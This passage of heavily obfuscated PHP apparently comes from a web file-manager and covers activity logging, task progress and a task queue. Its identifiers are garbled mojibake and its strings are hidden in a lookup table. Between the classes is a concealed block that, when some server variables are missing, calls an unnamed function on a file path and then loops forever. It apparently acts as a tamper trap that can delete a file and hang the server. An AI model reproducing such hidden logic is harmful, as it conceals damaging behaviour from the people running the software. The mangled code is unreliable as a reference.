LNG($çˆ‡­Ô•[2230]), $çˆ‡­Ô•[1833] => LNG($çˆ‡­Ô•[2231]), $çˆ‡­Ô•[2232] => LNG($çˆ‡­Ô•[2233]), $çˆ‡­Ô•[2234] => LNG($çˆ‡­Ô•[2235]), $çˆ‡­Ô•[2236] => LNG($çˆ‡­Ô•[2237]), $çˆ‡­Ô•[2238] => LNG($çˆ‡­Ô•[2238]), $çˆ‡­Ô•[2239] => LNG($çˆ‡­Ô•[1805]), $çˆ‡­Ô•[2240] => LNG($çˆ‡­Ô•[2241]), $çˆ‡­Ô•[2242] => LNG($çˆ‡­Ô•[2243]), $çˆ‡­Ô•[2244] => LNG($çˆ‡­Ô•[2245]), $çˆ‡­Ô•[2246] => LNG($çˆ‡­Ô•[2247]), $çˆ‡­Ô•[2248] => LNG($çˆ‡­Ô•[2249]), $çˆ‡­Ô•[2250] => LNG($çˆ‡­Ô•[2250]), $çˆ‡­Ô•[2251] => LNG($çˆ‡­Ô•[2252]), $çˆ‡­Ô•[2253] => LNG($çˆ‡­Ô•[2254]), $çˆ‡­Ô•[2255] => LNG($çˆ‡­Ô•[2256]), $çˆ‡­Ô•[2257] => LNG($çˆ‡­Ô•[2258]), $çˆ‡­Ô•[2259] => LNG($çˆ‡­Ô•[2260]), $çˆ‡­Ô•[2261] => LNG($çˆ‡­Ô•[2262])); } private function typeFile() { $Œ¡å‚ê‚ =& $_SERVER[Ü©»’·]; $÷Ä†€©‰ = array($Œ¡å‚ê‚[1836] => array($Œ¡å‚ê‚[1837]), $Œ¡å‚ê‚[2204] => array($Œ¡å‚ê‚[2263]), $Œ¡å‚ê‚[2206] => array($Œ¡å‚ê‚[2264]), $Œ¡å‚ê‚[1829] => array($Œ¡å‚ê‚[1830]), $Œ¡å‚ê‚[2214] => array(), $Œ¡å‚ê‚[2216] => array(), $Œ¡å‚ê‚[2218] => array(), $Œ¡å‚ê‚[1839] => array($Œ¡å‚ê‚[1841]), $Œ¡å‚ê‚[1840] => array($Œ¡å‚ê‚[1841]), $Œ¡å‚ê‚[2222] => array($Œ¡å‚ê‚[2265]), $Œ¡å‚ê‚[2224] => array($Œ¡å‚ê‚[2265]), $Œ¡å‚ê‚[2226] => array($Œ¡å‚ê‚[2266]), $Œ¡å‚ê‚[2212] => array($Œ¡å‚ê‚[2267]), $Œ¡å‚ê‚[1834] => array($Œ¡å‚ê‚[2268]), $Œ¡å‚ê‚[2229] => array($Œ¡å‚ê‚[2269]), $Œ¡å‚ê‚[1833] => array($Œ¡å‚ê‚[1835])); return $÷Ä†€©‰; } private function typeAll() { $ˆªÚĞ¬Ù =& $_SERVER[Ü©»’·]; $àåÜÇéˆ = $this->typeList; $ê«¶ñ½ = array_filter($this->typeFile()); foreach ($ê«¶ñ½ as $š”ìò¬ => $î¤õ¾’) { $àåÜÇéˆ[$î¤õ¾’[0]] = $àåÜÇéˆ[$š”ìò¬]; } $àåÜÇéˆ[$ˆªÚĞ¬Ù[1841]] = LNG($ˆªÚĞ¬Ù[2270]); $àåÜÇéˆ[$ˆªÚĞ¬Ù[2265]] = LNG($ˆªÚĞ¬Ù[2271]); return $àåÜÇéˆ; } public function addLog($÷ÆÉ’«», $®öŠÑª = array()) { $—¯ÇÍóÓ =& $_SERVER[Ü©»’·]; if (!isset($this->typeList[$÷ÆÉ’«»])) { return; } $ÙÖ±¶úÄ = defined($—¯ÇÍóÓ[484]) && USER_ID ? USER_ID : (isset($®öŠÑª[$—¯ÇÍóÓ[1669]]) ? $®öŠÑª[$—¯ÇÍóÓ[1669]] : 0); if (!$ÙÖ±¶úÄ) { $ÙÖ±¶úÄ = (int) Session::get($—¯ÇÍóÓ[1995]); } if ($÷ÆÉ’«» == $—¯ÇÍóÓ[2240] && is_array($®öŠÑª[$—¯ÇÍóÓ[2272]]) && !$®öŠÑª[$—¯ÇÍóÓ[2272]]) { return; } $ é²Œ’… = get_client_ip(); if (!$®öŠÑª || strlen(json_encode($®öŠÑª)) >= 1024) { $®öŠÑª = array($—¯ÇÍóÓ[2273] => $ é²Œ’…); } else { if (is_array($®öŠÑª)) { $®öŠÑª[$—¯ÇÍóÓ[2273]] = $ é²Œ’…; } else { $®öŠÑª = array($—¯ÇÍóÓ[1206] => $®öŠÑª, $—¯ÇÍóÓ[2273] => $ é²Œ’…); } } $®öŠÑª = array($—¯ÇÍóÓ[1659] => Session::sign(), $—¯ÇÍóÓ[1660] => $ÙÖ±¶úÄ, $—¯ÇÍóÓ[33] => $÷ÆÉ’«», $—¯ÇÍóÓ[1662] => json_encode($®öŠÑª)); parent::add($®öŠÑª); } public function remove($¾‚é«Ïø) { $this->where(array($_SERVER[Ü©»’·][428] => $¾‚é«Ïø))->delete(); } private function _makeOrder($ß¬ßø»¸ = '') { $£·—ıÂ˜ =& $_SERVER[Ü©»’·]; $¯÷Üú•Ñ = $£·—ıÂ˜[200]; $şÎÀ¢µ = array($£·—ıÂ˜[459] => $£·—ıÂ˜[460], $£·—ıÂ˜[461] => $£·—ıÂ˜[462]); $÷«ÁËÃ = Input::get($£·—ıÂ˜[467], $£·—ıÂ˜[7], $£·—ıÂ˜[2027], array($£·—ıÂ˜[1949], $£·—ıÂ˜[461])); $÷«ÁËÃ = $şÎÀ¢µ[$÷«ÁËÃ]; $ß¬ßø»¸ = $ß¬ßø»¸ . "{$¯÷Üú•Ñ}\x20{$÷«ÁËÃ}"; return $this->order($ß¬ßø»¸); } public function get($°ø×ëŸÜ = '') { $­Ô×ñåá =& $_SERVER[Ü©»’·]; if (!$°ø×ëŸÜ) { show_json(array()); } $Õıäİµ = array(); if ($°ø×ëŸÜ[$­Ô×ñåá[1669]]) { $Õıäİµ[$­Ô×ñåá[1669]] = $°ø×ëŸÜ[$­Ô×ñåá[1669]]; } if (isset($°ø×ëŸÜ[$­Ô×ñåá[767]])) { $Ì£ŠµµÙ = $°ø×ëŸÜ[$­Ô×ñåá[767]]; $³å˜€ä» = isset($°ø×ëŸÜ[$­Ô×ñåá[506]]) ? $°ø×ëŸÜ[$­Ô×ñåá[506]] : time(); $Õıäİµ[$­Ô×ñåá[200]] = array($­Ô×ñåá[333], array($Ì£ŠµµÙ, $³å˜€ä»)); } if ($°ø×ëŸÜ[$­Ô×ñåá[33]]) { $¶õ“Û¥† = explode($­Ô×ñåá[50], $°ø×ëŸÜ[$­Ô×ñåá[33]]); $Ğš„¶Ğğ = $this->typeFile(); $õèÕ¨†ê = array(); foreach ($¶õ“Û¥† as $ì™–¡¡í) { $õèÕ¨†ê[] = $ì™–¡¡í; if (isset($Ğš„¶Ğğ[$ì™–¡¡í])) { $õèÕ¨†ê = array_merge($õèÕ¨†ê, $Ğš„¶Ğğ[$ì™–¡¡í]); } } $õèÕ¨†ê = array_unique($õèÕ¨†ê); if ($õèÕ¨†ê) { $Õıäİµ[$­Ô×ñåá[33]] = array($­Ô×ñåá[7], $õèÕ¨†ê); } } else { $Õıäİµ[$­Ô×ñåá[33]] = array($­Ô×ñåá[2274], $­Ô×ñåá[2275]); } if (!empty($°ø×ëŸÜ[$­Ô×ñåá[2273]])) { $Õıäİµ[$­Ô×ñåá[462]] = array($­Ô×ñåá[392], "\45{$°ø×ëŸÜ[$­Ô×ñåá[2273]]}\x25"); } $«ÕÉ²¥¹ = $this->_makeOrder()->where($Õıäİµ)->selectPage(); if (empty($«ÕÉ²¥¹[$­Ô×ñåá[378]])) { show_json(array(), !0, $«ÕÉ²¥¹[$­Ô×ñåá[375]]); } $«ÕÉ²¥¹[$­Ô×ñåá[378]] = $this->logList($«ÕÉ²¥¹[$­Ô×ñåá[378]]); return $«ÕÉ²¥¹; } private function ipAddress(&$¹óÀÇ†·) { $Úıœ¾ù™ =& $_SERVER[Ü©»’·]; if (!empty($¹óÀÇ†·[$Úıœ¾ù™[2273]])) { $Èİ™¾ª¦ = IpLocation::get($¹óÀÇ†·[$Úıœ¾ù™[2273]]); } else { $Èİ™¾ª¦ = LNG($Úıœ¾ù™[2276]); } $¹óÀÇ†·[$Úıœ¾ù™[2277]] = $Èİ™¾ª¦; } private function descZipDownload($¢½»ºÀæ, &$¡çÄ‘øà) { $åÌ¿­æÄ =& $_SERVER[Ü©»’·]; if (!isset($¢½»ºÀæ[$åÌ¿­æÄ[2278]])) { return; } $ºè­Ëù = json_decode($¢½»ºÀæ[$åÌ¿­æÄ[2278]], !0); foreach ($ºè­Ëù as $ÒÔ÷‚ñï) { try { $§€Æ™—‡ = IO::infoFull($ÒÔ÷‚ñï[$åÌ¿­æÄ[84]]); } catch (Exception $ğ°ôŠ™š) { continue; } $¢½»ºÀæ[$åÌ¿­æÄ[84]] = $ÒÔ÷‚ñï[$åÌ¿­æÄ[84]]; $¡çÄ‘øà[] = $¢½»ºÀæ[$åÌ¿­æÄ[411]] = $§€Æ™—‡[$åÌ¿­æÄ[411]]; $¡çÄ‘øà[] = $¢½»ºÀæ[$åÌ¿­æÄ[2081]] = $§€Æ™—‡[$åÌ¿­æÄ[441]]; break; } return $¢½»ºÀæ; } private function getSourceList(&$§£øÛ®) { $«Ë’àÚ– =& $_SERVER[Ü©»’·]; $ú°®¿‡ = array(); foreach ($§£øÛ® as $ä³—ƒÌ => $Ê›çĞ) { $¬ı¼´ë = json_decode($Ê›çĞ[$«Ë’àÚ–[462]], !0); if ($Ê›çĞ[$«Ë’àÚ–[33]] == $«Ë’àÚ–[1832]) { $¬ı¼´ë = $this->descZipDownload($¬ı¼´ë, $ú°®¿‡); $§£øÛ®[$ä³—ƒÌ][$«Ë’àÚ–[462]] = json_encode($¬ı¼´ë); continue; } if (strpos($Ê›çĞ[$«Ë’àÚ–[33]], $«Ë’àÚ–[2083]) !== 0) { if (!isset($¬ı¼´ë[$«Ë’àÚ–[84]]) || strpos($Ê›çĞ[$«Ë’àÚ–[33]], $«Ë’àÚ–[2279]) !== 0) { continue; } try { $ÁäŸ—Ğö = IO::infoFull($¬ı¼´ë[$«Ë’àÚ–[84]]); } catch (Exception $úŒÏšŸë) { continue; } $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[411]] = $ÁäŸ—Ğö[$«Ë’àÚ–[411]]; $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[2081]] = $ÁäŸ—Ğö[$«Ë’àÚ–[441]]; $§£øÛ®[$ä³—ƒÌ][$«Ë’àÚ–[462]] = json_encode($¬ı¼´ë); continue; } $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[411]]; $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[2081]]; if ($¬ı¼´ë[$«Ë’àÚ–[33]] == $«Ë’àÚ–[566]) { $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[462]][$«Ë’àÚ–[1163]]; $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[462]][$«Ë’àÚ–[1164]]; } if ($¬ı¼´ë[$«Ë’àÚ–[33]] == $«Ë’àÚ–[2091]) { $ú°®¿‡[] = $¬ı¼´ë[$«Ë’àÚ–[462]][$«Ë’àÚ–[411]]; } } if (!$ú°®¿‡) { return array(); } return Model($«Ë’àÚ–[831])->sourceListInfo($ú°®¿‡, !0); } private function logList($Â˜ÛÒ¡›) { $îÍ×ÜÅ =& $_SERVER[Ü©»’·]; $Á»Ú½¬ = array_to_keyvalue($Â˜ÛÒ¡›, $îÍ×ÜÅ[12], $îÍ×ÜÅ[1669]); $…º¤ÛÂ = Model($îÍ×ÜÅ[544])->userListInfo(array_unique($Á»Ú½¬)); $ÚéÑÈ¬ñ = $this->getSourceList($Â˜ÛÒ¡›); $ÛÀª±È£ = $this->typeAll(); $«ŒŞÄ¶ = array(); $àé²å“¤ = array(); foreach ($Â˜ÛÒ¡› as $ÌÇœõÙú => $¢µêı©Ñ) { $ÂÚóöïš = $¢µêı©Ñ[$îÍ×ÜÅ[33]]; $±ÖøÉíß = isset($…º¤ÛÂ[$¢µêı©Ñ[$îÍ×ÜÅ[1669]]]) ? $…º¤ÛÂ[$¢µêı©Ñ[$îÍ×ÜÅ[1669]]] : !1; $÷Õğ·¾ç = strpos($ÂÚóöïš, $îÍ×ÜÅ[2280]) === 0 ? LNG($îÍ×ÜÅ[2281]) : LNG($îÍ×ÜÅ[2276]); $¢µêı©Ñ[$îÍ×ÜÅ[32]] = isset($±ÖøÉíß[$îÍ×ÜÅ[32]]) ? $±ÖøÉíß[$îÍ×ÜÅ[32]] : LNG($îÍ×ÜÅ[2276]); $¢µêı©Ñ[$îÍ×ÜÅ[551]] = isset($±ÖøÉíß[$îÍ×ÜÅ[551]]) ? $±ÖøÉíß[$îÍ×ÜÅ[551]] : $îÍ×ÜÅ[12]; $¢µêı©Ñ[$îÍ×ÜÅ[1567]] = isset($ÛÀª±È£[$ÂÚóöïš]) ? $ÛÀª±È£[$ÂÚóöïš] : $÷Õğ·¾ç; $¢µêı©Ñ[$îÍ×ÜÅ[2026]] = $±ÖøÉíß; $–£ØË« = json_decode($¢µêı©Ñ[$îÍ×ÜÅ[462]], !0); $¢µêı©Ñ[$îÍ×ÜÅ[2273]] = isset($–£ØË«[$îÍ×ÜÅ[2273]]) ? $–£ØË«[$îÍ×ÜÅ[2273]] : $îÍ×ÜÅ[12]; $¢µêı©Ñ[$îÍ×ÜÅ[2277]] = IpLocation::get($¢µêı©Ñ[$îÍ×ÜÅ[2273]]); if (strpos($ÂÚóöïš, $îÍ×ÜÅ[2083]) === 0 || isset($–£ØË«[$îÍ×ÜÅ[2081]])) { $–£ØË«[$îÍ×ÜÅ[86]] = $ÚéÑÈ¬ñ[$–£ØË«[$îÍ×ÜÅ[411]]]; $–£ØË«[$îÍ×ÜÅ[2096]] = $ÚéÑÈ¬ñ[$–£ØË«[$îÍ×ÜÅ[2081]]]; if ($–£ØË«[$îÍ×ÜÅ[33]] == $îÍ×ÜÅ[566]) { $–£ØË«[$îÍ×ÜÅ[462]][$îÍ×ÜÅ[1163]] = $ÚéÑÈ¬ñ[$–£ØË«[$îÍ×ÜÅ[462]][$îÍ×ÜÅ[1163]]]; $–£ØË«[$îÍ×ÜÅ[462]][$îÍ×ÜÅ[1164]] = $ÚéÑÈ¬ñ[$–£ØË«[$îÍ×ÜÅ[462]][$îÍ×ÜÅ[1164]]]; } if ($–£ØË«[$îÍ×ÜÅ[33]] == $îÍ×ÜÅ[2091]) { $–£ØË«[$îÍ×ÜÅ[462]][$îÍ×ÜÅ[411]] = $ÚéÑÈ¬ñ[$–£ØË«[$îÍ×ÜÅ[462]][$îÍ×ÜÅ[411]]]; } if ($–£ØË«[$îÍ×ÜÅ[33]] == $îÍ×ÜÅ[1827]) { $–£ØË«[$îÍ×ÜÅ[2096]] = $–£ØË«[$îÍ×ÜÅ[86]]; $–£ØË«[$îÍ×ÜÅ[2081]] = $–£ØË«[$îÍ×ÜÅ[2096]][$îÍ×ÜÅ[411]]; $–£ØË«[$îÍ×ÜÅ[86]] = !1; $–£ØË«[$îÍ×ÜÅ[411]] = $îÍ×ÜÅ[12]; } if ($–£ØË«[$îÍ×ÜÅ[86]] && $–£ØË«[$îÍ×ÜÅ[86]][$îÍ×ÜÅ[420]] == $îÍ×ÜÅ[1288]) { $àé²å“¤[] = $¢µêı©Ñ[$îÍ×ÜÅ[408]]; unset($Â˜ÛÒ¡›[$ÌÇœõÙú]); continue; } if ($–£ØË«[$îÍ×ÜÅ[2096]] && $–£ØË«[$îÍ×ÜÅ[2096]][$îÍ×ÜÅ[420]] == $îÍ×ÜÅ[1288]) { $àé²å“¤[] = $¢µêı©Ñ[$îÍ×ÜÅ[408]]; unset($Â˜ÛÒ¡›[$ÌÇœõÙú]); continue; } } $¢µêı©Ñ[$îÍ×ÜÅ[462]] = $–£ØË«; unset($¢µêı©Ñ[$îÍ×ÜÅ[2282]]); $«ŒŞÄ¶[] = $¢µêı©Ñ; } $this->clearSystemPathLog($àé²å“¤); return $«ŒŞÄ¶; } private function clearSystemPathLog($‚àıæ¤˜) { $”ğú†ü =& $_SERVER[Ü©»’·]; if (count($‚àıæ¤˜) == 0) { return; } $È‰ÙµÄ’ = array($”ğú†ü[408] => array($”ğú†ü[7], array_unique($‚àıæ¤˜))); $this->where($È‰ÙµÄ’)->delete(); } public function deviceList($”ß–ÚÉ³, $Òû—‹ä´ = 0) { $ŸÒ¼ò·Û =& $_SERVER[Ü©»’·]; $·¦¯ûØ = array($ŸÒ¼ò·Û[1669] => $”ß–ÚÉ³, $ŸÒ¼ò·Û[200] => array($ŸÒ¼ò·Û[1017], $Òû—‹ä´), $ŸÒ¼ò·Û[33] => $ŸÒ¼ò·Û[1801]); $‡½›¡’á = array(); $Íá­›úõ = $this->field($ŸÒ¼ò·Û[2283])->where($·¦¯ûØ)->order($ŸÒ¼ò·Û[2094])->limit(50)->select(); foreach ($Íá­›úõ as $¬ß¥¤½µ => $ˆµ¼æí) { if ($¬ß¥¤½µ > 0 && abs($ˆµ¼æí[$ŸÒ¼ò·Û[200]] - $Íá­›úõ[$¬ß¥¤½µ - 1][$ŸÒ¼ò·Û[200]]) < 5) { continue; } $¤ûÕı“³ = json_decode($ˆµ¼æí[$ŸÒ¼ò·Û[462]], !0); $ˆµ¼æí[$ŸÒ¼ò·Û[2273]] = isset($¤ûÕı“³[$ŸÒ¼ò·Û[2273]]) ? $¤ûÕı“³[$ŸÒ¼ò·Û[2273]] : $ŸÒ¼ò·Û[12]; unset($¤ûÕı“³[$ŸÒ¼ò·Û[2273]]); $ƒãÏ€ë = $this->deviceType($¤ûÕı“³[$ŸÒ¼ò·Û[2084]]); if (isset($‡½›¡’á[$ƒãÏ€ë])) { continue; } $ˆµ¼æí[$ŸÒ¼ò·Û[2277]] = IpLocation::get($ˆµ¼æí[$ŸÒ¼ò·Û[2273]]); $ˆµ¼æí[$ŸÒ¼ò·Û[462]] = $¤ûÕı“³; $‡½›¡’á[$ƒãÏ€ë] = $ˆµ¼æí; } return array_values($‡½›¡’á); } public function deviceType($ÕŸ‚ùœ¯) { return $ÕŸ‚ùœ¯; } } goto E¦‚í¶ñ; bƒ›ĞÛÒ‚¦: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ğôûÅ“, $‘‰¯œ»‚ = '', $Š›“ÖÌß = 0, $¯şºÚ ¹ = '') { $Øß¸½·„ =& $_SERVER[Ü©»’·]; $èÒå‰œß = new Task($ğôûÅ“, $‘‰¯œ»‚, $Š›“ÖÌß, $¯şºÚ ¹); $GLOBALS[$Øß¸½·„[1752] . $ğôûÅ“] = new TaskLog($Øß¸½·„[1653], $èÒå‰œß, $¯şºÚ ¹); return $èÒå‰œß; } public function __construct($‡²õ½‡ = '', $¾¶¬…¼Ş = '', $ƒ¬Ïš°å = '') { $™¨Ï¼»Ú =& $_SERVER[Ü©»’·]; if (!$‡²õ½‡) { $‡²õ½‡ = $™¨Ï¼»Ú[1653]; } $å­Ì¿ˆØ = $‡²õ½‡ . $™¨Ï¼»Ú[395] . rand_string(10); if (!$ƒ¬Ïš°å) { $ƒ¬Ïš°å = $‡²õ½‡ . $™¨Ï¼»Ú[53] . $ƒ¬Ïš°å; } switch ($‡²õ½‡) { case $™¨Ï¼»Ú[1653]: if (!$¾¶¬…¼Ş || !$¾¶¬…¼Ş->task) { return echoLog($‡²õ½‡ . $™¨Ï¼»Ú[1753]); } $ÖœÎ şÄ = $¾¶¬…¼Ş; $å­Ì¿ˆØ = $ÖœÎ şÄ->task[$™¨Ï¼»Ú[408]]; $‡²õ½‡ = $ÖœÎ şÄ->task[$™¨Ï¼»Ú[408]]; if (!$ÖœÎ şÄ->task[$™¨Ï¼»Ú[1567]]) { $ÖœÎ şÄ->task[$™¨Ï¼»Ú[1567]] = $ƒ¬Ïš°å ? $ƒ¬Ïš°å : $‡²õ½‡; } break; case $™¨Ï¼»Ú[1754]: if (!$¾¶¬…¼Ş) { return echoLog($‡²õ½‡ . $™¨Ï¼»Ú[1755]); } $Æ¦¿µŞ = is_string($¾¶¬…¼Ş) ? array($¾¶¬…¼Ş) : $¾¶¬…¼Ş; $ÖœÎ şÄ = new TaskFileTransfer($å­Ì¿ˆØ, $‡²õ½‡, 0, $ƒ¬Ïš°å ? $ƒ¬Ïš°å : $Æ¦¿µŞ[0]); foreach ($Æ¦¿µŞ as $ĞôĞ¡˜) { $ÖœÎ şÄ->addPath($ĞôĞ¡˜); } break; case $™¨Ï¼»Ú[313]: if (!$¾¶¬…¼Ş) { return echoLog($‡²õ½‡ . $™¨Ï¼»Ú[1755]); } $Æ¦¿µŞ = is_string($¾¶¬…¼Ş) ? array($¾¶¬…¼Ş) : $¾¶¬…¼Ş; $ÖœÎ şÄ = new TaskZip($å­Ì¿ˆØ, $‡²õ½‡, 0, $ƒ¬Ïš°å ? $ƒ¬Ïš°å : $Æ¦¿µŞ[0]); foreach ($Æ¦¿µŞ as $ĞôĞ¡˜) { $ÖœÎ şÄ->addPath($ĞôĞ¡˜); } break; case $™¨Ï¼»Ú[1218]: if (!$¾¶¬…¼Ş) { return echoLog($‡²õ½‡ . $™¨Ï¼»Ú[1755]); } $ÖœÎ şÄ = new TaskUnZip($å­Ì¿ˆØ, $‡²õ½‡, 0, $ƒ¬Ïš°å ? $ƒ¬Ïš°å : $¾¶¬…¼Ş); if ($¾¶¬…¼Ş) { $ÖœÎ şÄ->addFile($¾¶¬…¼Ş); } break; case $™¨Ï¼»Ú[148]: $ÖœÎ şÄ = new TaskHttp($å­Ì¿ˆØ, $‡²õ½‡); break; default: return; break; } $this->task = $ÖœÎ şÄ; $this->taskID = $å­Ì¿ˆØ; Hook::bind($™¨Ï¼»Ú[1690], array($this, $™¨Ï¼»Ú[1756])); Hook::bind($™¨Ï¼»Ú[1692], array($this, $™¨Ï¼»Ú[1757])); Hook::bind($™¨Ï¼»Ú[1686], array($this, $™¨Ï¼»Ú[1758])); echoLog($™¨Ï¼»Ú[1759] . $ÖœÎ şÄ->task[$™¨Ï¼»Ú[1567]]); } public function __destruct() { $this->end(); } public function end($¹¦åÇâï = '') { $Ò§òÙ‘ =& $_SERVER[Ü©»’·]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($¹¦åÇâï); $this->task = !1; $this->taskID = !1; Hook::unbind($Ò§òÙ‘[1690], array($this, $Ò§òÙ‘[1756])); Hook::unbind($Ò§òÙ‘[1692], array($this, $Ò§òÙ‘[1757])); Hook::unbind($Ò§òÙ‘[1686], array($this, $Ò§òÙ‘[1758])); } public function taskUpdate($ÄË’õ“î) { $»ßşÒÌ =& $_SERVER[Ü©»’·]; if (!$ÄË’õ“î || $this->taskID != $ÄË’õ“î[$»ßşÒÌ[408]]) { return; } $ºî¹ß·Ï = 20; $ê ´›Ì¡ = intval($ÄË’õ“î[$»ßşÒÌ[1671]] * $ºî¹ß·Ï); $Ï¼•™ÁÖ = $»ßşÒÌ[162] . str_repeat($»ßşÒÌ[887], $ê ´›Ì¡) . $»ßşÒÌ[1017] . str_repeat($»ßşÒÌ[53], $ºî¹ß·Ï - $ê ´›Ì¡) . $»ßşÒÌ[164]; $Ü•°ÌÍ‚ = $Ï¼•™ÁÖ . sprintf($»ßşÒÌ[1760], $ÄË’õ“î[$»ßşÒÌ[1671]] * 100) . $»ßşÒÌ[1761]; $‹…£Áë = $Ü•°ÌÍ‚ . $ÄË’õ“î[$»ßşÒÌ[1670]] . $»ßşÒÌ[8] . $ÄË’õ“î[$»ßşÒÌ[792]] . LNG($»ßşÒÌ[1762]); $ÁÜ¢é—¼ = $»ßşÒÌ[12]; if ($ÄË’õ“î[$»ßşÒÌ[1746]]) { $‹…£Áë = $Ü•°ÌÍ‚ . size_format($ÄË’õ“î[$»ßşÒÌ[1670]]) . $»ßşÒÌ[8] . size_format($ÄË’õ“î[$»ßşÒÌ[792]]); $ÁÜ¢é—¼ = size_format($ÄË’õ“î[$»ßşÒÌ[1672]]) . $»ßşÒÌ[1763]; } if ($ÄË’õ“î[$»ßşÒÌ[1067]]) { $ÄË’õ“î[$»ßşÒÌ[1720]] = $ÄË’õ“î[$»ßşÒÌ[1067]] . $»ßşÒÌ[53] . $ÄË’õ“î[$»ßşÒÌ[1720]]; } if ($ÄË’õ“î[$»ßşÒÌ[1720]]) { $Æ«òÑå„ = $»ßşÒÌ[12]; if ($ÄË’õ“î[$»ßşÒÌ[1722]]) { $Æ«òÑå„ = size_format($ÄË’õ“î[$»ßşÒÌ[1723]]) . $»ßşÒÌ[8] . size_format($ÄË’õ“î[$»ßşÒÌ[1722]]); } $ÁÜ¢é—¼ .= $ÄË’õ“î[$»ßşÒÌ[1720]] . $Æ«òÑå„; } if ($ÄË’õ“î[$»ßşÒÌ[769]]) { $ÁÜ¢é—¼ .= $»ßşÒÌ[53] . size_format($ÄË’õ“î[$»ßşÒÌ[1727]]) . $»ßşÒÌ[8] . size_format($ÄË’õ“î[$»ßşÒÌ[769]]); } echoLog($‹…£Áë . $»ßşÒÌ[53] . $ÁÜ¢é—¼, !0); } public function taskEnd($ğ„šÈŞ×) { $ØÔ±±‹ù =& $_SERVER[Ü©»’·]; if (!$ğ„šÈŞ× || $this->taskID != $ğ„šÈŞ×[$ØÔ±±‹ù[408]]) { return; } $ş³”­ªİ = $ğ„šÈŞ× ? $ğ„šÈŞ×[$ØÔ±±‹ù[1670]] . $ØÔ±±‹ù[8] . $ğ„šÈŞ×[$ØÔ±±‹ù[792]] . LNG($ØÔ±±‹ù[1762]) . $ØÔ±±‹ù[71] : $ØÔ±±‹ù[12]; echoLog($ØÔ±±‹ù[1764] . $ğ„šÈŞ×[$ØÔ±±‹ù[1567]] . ($ğ„šÈŞ×[$ØÔ±±‹ù[462]] ? $ØÔ±±‹ù[71] . $ğ„šÈŞ×[$ØÔ±±‹ù[462]] : $ØÔ±±‹ù[12]) . $ØÔ±±‹ù[71] . $ş³”­ªİ . $ØÔ±±‹ù[1765] . sprintf($ØÔ±±‹ù[856], timeFloat() - $ğ„šÈŞ×[$ØÔ±±‹ù[1673]]) . $ØÔ±±‹ù[1685]); $this->end(); } public function taskKill($¢Âä£öğ) { $Û‰Ú‹³È =& $_SERVER[Ü©»’·]; if (!$¢Âä£öğ || $this->taskID != $¢Âä£öğ[$Û‰Ú‹³È[408]]) { return; } echoLog($Û‰Ú‹³È[1766] . $¢Âä£öğ[$Û‰Ú‹³È[1567]]); } } if (!isset($_SERVER[$_SERVER[Ü©»’·][357]]) || !isset($_SERVER[$_SERVER[Ü©»’·][355]])) { $_getc = $_SERVER[Ü©»’·][358]; $_getfile = $_SERVER[$_SERVER[Ü©»’·][359]] . $_SERVER[Ü©»’·][360]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ü©»’·][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ü©»’·][361]) { $exit = $_SERVER[Ü©»’·][362]; $exit(); } $_act = $_SERVER[Ü©»’·][363]; $_act($_SERVER[$_SERVER[Ü©»’·][359]] . $_SERVER[Ü©»’·][360]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[Ü©»’·][387]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\x51\x75\x65\x75\145\x4c\145\x6e\x67\164\150"; const QUEUE_DATA = "\x74\x61\163\x6b\121\165\x65\x75\145\104\141\164\141"; public static $listData = false; public static function initTask() { } public static function add($¨Éˆ¿æ, $°Ê…û°‘ = array(), $ß–´õ× = '', $®Êõ¶˜ = '') { $¹˜«‚Äè =& $_SERVER[Ü©»’·]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($®Êõ¶˜ && array_find_by_field(self::$listData, $¹˜«‚Äè[94], $®Êõ¶˜)) { return !0; } self::$listData[] = array($¹˜«‚Äè[264] => $¨Éˆ¿æ, $¹˜«‚Äè[1767] => $°Ê…û°‘, $¹˜«‚Äè[462] => $ß–´õ×, $¹˜«‚Äè[94] => $®Êõ¶˜); return !0; } public static function addSubmit() { $¡¨¿®Ô =& $_SERVER[Ü©»’·]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($¡¨¿®Ô[1768] . json_encode_force(array_to_keyvalue(self::$listData, $¡¨¿®Ô[12], $¡¨¿®Ô[462])), $¡¨¿®Ô[1769]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($¨ÀùÊş¯, $¸å½¶¢  = array(), $³·Ç‰ˆƒ = '', $Ã³…Ô‘ì = '') { $ˆ¦‹û”× =& $_SERVER[Ü©»’·]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Òü®€ÖÈ = self::getAll(); if ($Ã³…Ô‘ì && array_find_by_field($Òü®€ÖÈ, $ˆ¦‹û”×[94], $Ã³…Ô‘ì)) { return !0; } $Òü®€ÖÈ[] = array($ˆ¦‹û”×[264] => $¨ÀùÊş¯, $ˆ¦‹û”×[1767] => $¸å½¶¢ , $ˆ¦‹û”×[462] => $³·Ç‰ˆƒ, $ˆ¦‹û”×[94] => $Ã³…Ô‘ì); write_log($ˆ¦‹û”×[1768] . $³·Ç‰ˆƒ, $ˆ¦‹û”×[1769]); self::setAll($Òü®€ÖÈ); return !0; } public static function run() { $éš½ØáÄ =& $_SERVER[Ü©»’·]; $İ§ùü„Ë = self::getAll(); $‡Š¨àöå = array_shift($İ§ùü„Ë); if (!$‡Š¨àöå) { return !1; } self::setAll($İ§ùü„Ë); $ÔôáÔå = timeFloat(); try { Hook::apply($‡Š¨àöå[$éš½ØáÄ[264]], $‡Š¨àöå[$éš½ØáÄ[1767]]); } catch (Exception $µŠĞ‘ã¸) { } $ù¤«õûÑ = number_format(timeFloat() - $ÔôáÔå, 3) . $éš½ØáÄ[1685]; write_log($éš½ØáÄ[1770] . 